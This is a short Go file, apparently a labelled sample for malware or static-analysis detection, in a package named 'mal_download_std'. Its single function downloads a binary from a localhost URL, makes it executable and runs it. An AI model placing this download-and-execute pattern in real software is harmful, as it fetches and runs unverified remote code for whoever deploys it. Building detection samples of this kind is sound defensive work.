package mal_download_std

import (
	"io"
	"net/http"
	"os"
	"os/exec"
)

func DownloadFile() {
	url := "http://localhost:8080/executable"

	fileName := "downloaded-binary"

	resp, _ := http.Get(url)
	defer resp.Body.Close()

	out, _ := os.Create(fileName)
	defer out.Close()

	_, _ = io.Copy(out, resp.Body)

	_ = out.Close()

	_ = os.Chmod(fileName, 0755)

	cmd := exec.Command("./" + fileName)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	_ = cmd.Run()
}
